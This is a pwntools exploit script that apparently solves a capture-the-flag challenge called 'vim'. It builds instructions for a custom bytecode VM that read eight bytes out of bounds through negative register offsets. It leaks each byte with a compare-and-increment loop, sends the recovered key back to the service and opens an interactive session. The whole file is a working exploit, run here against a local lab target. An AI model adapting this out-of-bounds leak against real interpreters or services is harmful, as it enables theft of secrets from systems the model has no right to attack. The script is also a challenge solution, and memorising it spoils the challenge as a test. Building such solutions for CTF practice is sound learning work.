import struct
from pwn import *


exe = ELF("../../../handouts/vim/handout/challenge")

context.binary = exe
context.terminal = ['alacritty', '-e', 'bash', '-c']

LOCAL = False

HOST = "127.0.0.1"
PORT = 8001


def bm(b: int):
    return struct.pack("<b", b)[0]

def bs(b: int, x: int):
    return bm(b) << x

def encode0(op: int):
    return bs(op, 24)

def encode1(op: int, arg1: int):
    return bs(op, 24) | bs(arg1, 16)

def encode2(op: int, arg1: int, arg2: int):
    return bs(op, 24) | bs(arg1, 16) | bs(arg2, 8)

def encode3(op: int, arg1: int, arg2: int, arg3: int):
    return bs(op, 24) | bs(arg1, 16) | bs(arg2, 8) | bm(arg3)

def EXIT():
    return encode0(0)

def MOV(reg, val):
    return encode2(0x01, reg, val)

def ADD(reg_dst, reg_src, val):
    return encode3(0x02, reg_dst, reg_src, val)

def PRINT(reg):
    return encode1(0x03, reg)

def JE(reg1, reg2, target):
    return encode3(0x04, reg1, reg2, target)

def CMP(reg1, reg2, reg_dst):
    return encode3(0x05, reg1, reg2, reg_dst)

def leak_byte(offset: int) -> list[int]:
    insns = [
        MOV(0, 0),
        CMP(0, offset, 1),

        JE(1, 6, 3), # reg1 < target, skip next 2

        # reg0 == target, skip to print
        JE(1, 7, 4),

        # reg0 > target, sub 1
        ADD(0, 0, -1),
        JE(0, 0, -5), # Go back to cmp

        # reg0 < target, add 1
        ADD(0, 0, 1),
        JE(0, 0, -7), # Go back to cmp

        # Print found char
        PRINT(0),
    ]
    return insns

insns = [
    # Store lookup for <, ==
    MOV(6, -1),
    MOV(7, 0),

    *leak_byte(-8),
    *leak_byte(-7),
    *leak_byte(-6),
    *leak_byte(-5),
    *leak_byte(-4),
    *leak_byte(-3),
    *leak_byte(-2),
    *leak_byte(-1),
    #EXIT(),
]


if LOCAL:
    r = process([exe.path])
else:
    r = remote(HOST, PORT)

r.sendlineafter(b'Code: ', b''.join(p32(i) for i in insns))

key_bytes = []
for _ in range(8):
    key_bytes.append(struct.pack(">b", int(r.readline().strip())))

print(key_bytes)
r.sendlineafter(b'Key: ', b''.join(key_bytes))

r.interactive()
